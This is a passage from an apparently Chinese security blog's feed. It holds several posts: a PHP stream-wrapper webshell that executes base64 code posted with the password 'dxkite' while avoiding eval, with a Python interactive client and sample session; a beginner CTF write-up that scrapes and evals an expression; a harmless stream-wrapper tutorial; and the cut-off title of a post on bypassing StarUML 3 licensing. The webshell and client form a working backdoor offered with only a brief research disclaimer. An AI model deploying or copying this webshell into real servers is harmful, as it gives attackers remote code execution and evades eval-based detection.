&#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;position += $offset;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> SEEK_END:</span><br><span class="line">                <span class="keyword">if</span> (strlen(<span class="keyword">$this</span>-&gt;code) + $offset &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;position = strlen(<span class="keyword">$this</span>-&gt;code) + $offset;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_stat</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) &amp;&amp; $_POST[<span class="string">'code'</span>]) &#123;</span><br><span class="line">            stream_wrapper_register(<span class="string">'shell'</span>, ShellStream::class);</span><br><span class="line">            <span class="keyword">if</span> ($_POST[<span class="string">'password'</span>]==<span class="string">'dxkite'</span>) &#123;</span><br><span class="line">                $code = $_POST[<span class="string">'code'</span>];</span><br><span class="line">                <span class="keyword">include</span> <span class="string">'shell://'</span>.$code;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">include</span> <span class="string">'shell://PD9waHAgZWNobyAiaGVsbG8gaGFjayI7'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ShellStream::shell();</span><br></pre></td></tr></table></figure><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><p>不打算做菜刀适配，本文仅供安全研究</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_raw</span><span class="params">(url,password,cmd)</span>:</span></span><br><span class="line">    res=requests.post(url,&#123;</span><br><span class="line">        <span class="string">'password'</span>:password,</span><br><span class="line">        <span class="string">'code'</span>: base64.b64encode(cmd.encode(<span class="string">'utf-8'</span>)) </span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_php_shell</span><span class="params">(url,password,cmd)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_raw(url,password,<span class="string">'&lt;?php '</span>+cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt;= <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'Usage:\r\n\tpython shell.py url password'</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    password =sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        cmd = input(<span class="string">'php-shell&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> cmd.startswith(<span class="string">'run'</span>):</span><br><span class="line">            cmd,path = cmd.split(<span class="string">' '</span>,<span class="number">1</span>)</span><br><span class="line">            code = <span class="string">''</span></span><br><span class="line">            <span class="keyword">with</span> open(path) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                    code = code + line + <span class="string">"\r\n"</span> </span><br><span class="line">            response = send_raw(url,password,code);</span><br><span class="line">            print(response)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = send_php_shell(url,password,cmd);</span><br><span class="line">            print(response)</span><br></pre></td></tr></table></figure><h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Server\Local\suda\public\assets\eval&gt; python .\shell.py &apos;http://suda.atd3.org/assets/eval/shell.php&apos; dxkite</span><br><span class="line">php-shell&gt;echo &apos;hello,dxkite&apos;;</span><br><span class="line">hello,dxkite</span><br><span class="line">php-shell&gt;echo __FILE__;</span><br><span class="line">D:\Server\Local\suda\public\assets\eval\6070fc111c81737d263f97471b4f31ee.shell</span><br><span class="line">php-shell&gt;exit</span><br><span class="line">PS D:\Server\Local\suda\public\assets\eval&gt;</span><br></pre></td></tr></table></figure><h2 id="代码审计避免此类Shell"><a href="#代码审计避免此类Shell" class="headerlink" title="代码审计避免此类Shell"></a>代码审计避免此类Shell</h2><ul><li>接受了外部输入</li><li>注册了孤岛式的流包装器</li></ul>]]></content>
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>x10sec web2 题解</title>
      <link href="/2018/07/02/x10sec-web2-writeup/"/>
      <url>/2018/07/02/x10sec-web2-writeup/</url>
      <content type="html"><![CDATA[<ul><li>题目地址：<a href="https://ctf.x10sec.org/web2" target="_blank" rel="noopener">https://ctf.x10sec.org/web2</a></li><li>题目级别：入门级</li><li>题目考察：<ul><li>基本编程技能</li><li>网页处理</li></ul></li></ul><a id="more"></a><h2 id="步骤1：观察页面结构，获取题目页面"><a href="#步骤1：观察页面结构，获取题目页面" class="headerlink" title="步骤1：观察页面结构，获取题目页面"></a>步骤1：观察页面结构，获取题目页面</h2><p>通过浏览器开发工具查看页面结构，定位到页面表达式节点元素，从下图可以看到，页面表达式元素的位置为 <code>div[name=my_expr]</code> 节点的内容。</p><p><img src="1.png" alt=""></p><p>在这里，我们使用 <code>Python</code> 的 <code>requests</code> 库来请求页面。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 创建一个回话，保证Cookie的一致性</span></span><br><span class="line">user = requests.session()</span><br><span class="line"><span class="comment"># GET 页面</span></span><br><span class="line">res = user.get(<span class="string">'https://ctf.x10sec.org/web2/'</span>)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>运行以上脚本后，我们获取了页面的HTML。</p><h2 id="步骤2：使用Python提取表达式"><a href="#步骤2：使用Python提取表达式" class="headerlink" title="步骤2：使用Python提取表达式"></a>步骤2：使用Python提取表达式</h2><p>提取页面表达式我们一般用正则来提取，从HTML中提取节点一般用 <code>PyQuery</code> 来提取，使用方式和 <code>JQuery</code> 类似</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> PQ</span><br><span class="line">user = requests.session()</span><br><span class="line">res = user.get(<span class="string">'https://ctf.x10sec.org/web2/'</span>)</span><br><span class="line"><span class="comment"># 创建 DOM 树</span></span><br><span class="line">dom=PQ(res.text)</span><br><span class="line"><span class="comment"># 查询节点</span></span><br><span class="line">print(dom(<span class="string">'div[name=my_expr]'</span>).text().strip())</span><br></pre></td></tr></table></figure><p>运行上述代码后，我们的表达式都是正规的英文字符，所以我们使用 <code>Python</code> 来直接计算，去掉等号，计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> PQ</span><br><span class="line">user = requests.session()</span><br><span class="line">res = user.get(<span class="string">'https://ctf.x10sec.org/web2/'</span>)</span><br><span class="line">dom=PQ(res.text)</span><br><span class="line">get = dom(<span class="string">'div[name=my_expr]'</span>).text().strip()</span><br><span class="line"><span class="comment"># 正则提取表达式 去除括号</span></span><br><span class="line">exp=re.search(<span class="string">'^(.+)=.+$'</span>, get).group(<span class="number">1</span>)</span><br><span class="line">ans = eval(exp)</span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure><h2 id="步骤3：提交答案"><a href="#步骤3：提交答案" class="headerlink" title="步骤3：提交答案"></a>步骤3：提交答案</h2><p>从提取的页面可以看到，答案提交的地址是 <code>https://ctf.x10sec.org/web2?action=check_pass</code> 提交的字段也不多，就一条 <code>pass_key</code><br>提交答案后，如果提交失败会提示 <code>Wrong Answer</code> ，提交正确的时候原表达式的位置会是flag，因此，有如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding = utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> PQ</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user = requests.session();</span><br><span class="line">res = user.get(<span class="string">'https://ctf.x10sec.org/web2/'</span>)</span><br><span class="line">dom = PQ(res.text)</span><br><span class="line">get = dom(<span class="string">'div[name=my_expr]'</span>).text().strip()</span><br><span class="line">exp=re.search(<span class="string">'^(.+)=.+$'</span>, get).group(<span class="number">1</span>)</span><br><span class="line">ans = eval(exp)</span><br><span class="line"><span class="comment"># POST 提交答案</span></span><br><span class="line">res = user.post(<span class="string">'https://ctf.x10sec.org/web2?action=check_pass'</span>,&#123;</span><br><span class="line">    <span class="string">'pass_key'</span> : ans,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment"># 判断返回页面</span></span><br><span class="line"><span class="keyword">if</span> re.search(<span class="string">'Wrong Answer'</span>,res.text):</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Wrong Answer"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"I Get Flag: %s"</span> % PQ(res.text)(<span class="string">'div[name=my_expr]'</span>).text().strip())</span><br></pre></td></tr></table></figure><p>入门级难度，代码讲的比较详细，具体用法自己去摸索下，Python最好多用用</p>]]></content>
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>特殊方式运行PHP代码</title>
      <link href="/2018/07/01/eval-php-without-function-eval/"/>
      <url>/2018/07/01/eval-php-without-function-eval/</url>
      <content type="html"><![CDATA[<p>之前一直在想一个问题，怎么在不使用<code>eval</code>函数的前提下执行php代码，因为不管是一句话还是其他的骚操作好像都要通过<code>eval</code>函数来执行PHP代码（如果有其他方式，请指出吧，我表示就知道一个），现在的一句话代码也是如此，那么如何绕过这个东西来执行代码？用PHP也有几年了，今天突然灵光一闪，我们来看下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'http://www.test.com/xx.php'</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>如上代码可以通过包含远程HTTP文件来执行PHP文件，也就是执行远程代码，我们在玩一句话的时候基本上都不使用这些东西来操纵，如果我们设置了环境变了<code></code>不过也提供了一些思路，现在们来了解下这串代码所包含的含义，先看下我如今的PHP配置项</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;;;;;;;;;;;;;;;;;;</span></span><br><span class="line"><span class="comment">; Fopen wrappers ;</span></span><br><span class="line"><span class="comment">;;;;;;;;;;;;;;;;;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Whether to allow the treatment of URLs (like http:// or ftp://) as files.</span></span><br><span class="line"><span class="comment">; http://php.net/allow-url-fopen</span></span><br><span class="line"><span class="attr">allow_url_fopen</span> =<span class="literal">Off</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Whether to allow include/require to open URLs (like http:// or ftp://) as files.</span></span><br><span class="line"><span class="comment">; http://php.net/allow-url-include</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">Off</span></span><br></pre></td></tr></table></figure><p>在默认的情况下，好像可以通过<code>include</code>来包含远程文件，现在我们把这两个都关了，远程文件打开和远程文件包含都禁止使用，也就是说，上面第一串代码也就算是失效了</p><h2 id="PHP的包装器"><a href="#PHP的包装器" class="headerlink" title="PHP的包装器"></a>PHP的包装器</h2><p>在上面的配置文件中，我们看到了一个概念 <code>Fopen Wrapper</code> , 在官方的参考文档中的位置：<a href="http://php.net/manual/en/class.streamwrapper.php" target="_blank" rel="noopener">http://php.net/manual/en/class.streamwrapper.php</a> 在这里中我们可以看到一个标准的包装器的介绍，那么，我们实现一个包装器来执行代码怎么样？？</p><blockquote><p><strong>开发任务</strong><br>实现一个包装器，使其出现如下代码的时候输出 <code>&#39;hello, dxkite&#39;</code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'hello://dxkite'</span></span><br></pre></td></tr></table></figure><h2 id="HelloStream-实现"><a href="#HelloStream-实现" class="headerlink" title="HelloStream 实现"></a>HelloStream 实现</h2><p>对于一个流来说，按照官方的文档，必须实现如下的类方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">streamWrapper &#123;</span><br><span class="line">    <span class="comment">/* Properties */</span></span><br><span class="line">    <span class="keyword">public</span> resource $context ;</span><br><span class="line">    <span class="comment">/* Methods */</span></span><br><span class="line">    __construct ( void )</span><br><span class="line">    __destruct ( void )</span><br><span class="line">    <span class="keyword">public</span> bool dir_closedir ( void )</span><br><span class="line">    <span class="keyword">public</span> bool dir_opendir ( string $path , int $options )</span><br><span class="line">    <span class="keyword">public</span> string dir_readdir ( void )</span><br><span class="line">    <span class="keyword">public</span> bool dir_rewinddir ( void )</span><br><span class="line">    <span class="keyword">public</span> bool mkdir ( string $path , int $mode , int $options )</span><br><span class="line">    <span class="keyword">public</span> bool rename ( string $path_from , string $path_to )</span><br><span class="line">    <span class="keyword">public</span> bool rmdir ( string $path , int $options )</span><br><span class="line">    <span class="keyword">public</span> resource stream_cast ( int $cast_as )</span><br><span class="line">    <span class="keyword">public</span> void stream_close ( void )</span><br><span class="line">    <span class="keyword">public</span> bool stream_eof ( void )</span><br><span class="line">    <span class="keyword">public</span> bool stream_flush ( void )</span><br><span class="line">    <span class="keyword">public</span> bool stream_lock ( int $operation )</span><br><span class="line">    <span class="keyword">public</span> bool stream_metadata ( string $path , int $option , mixed $value )</span><br><span class="line">    <span class="keyword">public</span> bool stream_open ( string $path , string $mode , int $options , string &amp;$opened_path )</span><br><span class="line">    <span class="keyword">public</span> string stream_read ( int $count )</span><br><span class="line">    <span class="keyword">public</span> bool stream_seek ( int $offset , int $whence = SEEK_SET )</span><br><span class="line">    <span class="keyword">public</span> bool stream_set_option ( int $option , int $arg1 , int $arg2 )</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">array</span> stream_stat ( void )</span><br><span class="line">    <span class="keyword">public</span> int stream_tell ( void )</span><br><span class="line">    <span class="keyword">public</span> bool stream_truncate ( int $new_size )</span><br><span class="line">    <span class="keyword">public</span> int stream_write ( string $data )</span><br><span class="line">    <span class="keyword">public</span> bool unlink ( string $path )</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">array</span> url_stat ( string $path , int $flags )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在刚开始测试的时候，发现只需要实现用到的方法即可，不需要实现所有的功能，实现如下接口的功能即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span>  <span class="title">IncludeStreamWrapper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_open</span><span class="params">($path, $mode, $options, &amp;$opened_path)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_read</span><span class="params">($count)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_tell</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_eof</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_seek</span><span class="params">($offset, $whence)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_stat</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照这个写法，我们实现一个我们自己的 <code>HelloStream</code> 类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloStream</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $position;</span><br><span class="line">    <span class="keyword">protected</span> $code;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_open</span><span class="params">($path, $mode, $options, &amp;$opened_path)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $url = parse_url($path);</span><br><span class="line">        $name = $url[<span class="string">"host"</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="string">"&lt;?php echo 'hello, &#123;$name&#125;';"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;position = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_read</span><span class="params">($count)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ret = substr(<span class="keyword">$this</span>-&gt;code, <span class="keyword">$this</span>-&gt;position, $count);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;position += strlen($ret);</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_tell</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;position;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_eof</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;position &gt;= strlen(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_seek</span><span class="params">($offset, $whence)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($whence) &#123;</span><br><span class="line">            <span class="keyword">case</span> SEEK_SET:</span><br><span class="line">                <span class="keyword">if</span> ($offset &lt; strlen(<span class="keyword">$this</span>-&gt;code) &amp;&amp; $offset &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;position = $offset;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> SEEK_CUR:</span><br><span class="line">                <span class="keyword">if</span> ($offset &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;position += $offset;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> SEEK_END:</span><br><span class="line">                <span class="keyword">if</span> (strlen(<span class="keyword">$this</span>-&gt;code) + $offset &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;position = strlen(<span class="keyword">$this</span>-&gt;code) + $offset;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_stat</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注册-HelloStream"><a href="#注册-HelloStream" class="headerlink" title="注册 HelloStream"></a>注册 HelloStream</h2><p>通过函数 <code>stream_wrapper_register</code> 注册包装器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> .<span class="string">'/HelloStream.php'</span>;</span><br><span class="line"></span><br><span class="line">stream_wrapper_register(<span class="string">'hello'</span>, HelloStream::class);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'hello://dxkite'</span>;</span><br></pre></td></tr></table></figure><p>运行这串代码我们可以看到如下的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\WorkSpace\PHP\Stream&gt; php test.php</span><br><span class="line">hello, dxkite</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>绕过StarUML3 正版验证，去除水印</title>
      <link href="/2018/06/15/bypass-staruml-3/"/>
      <url>/2018/06/15/bypass-staruml-3/</url>
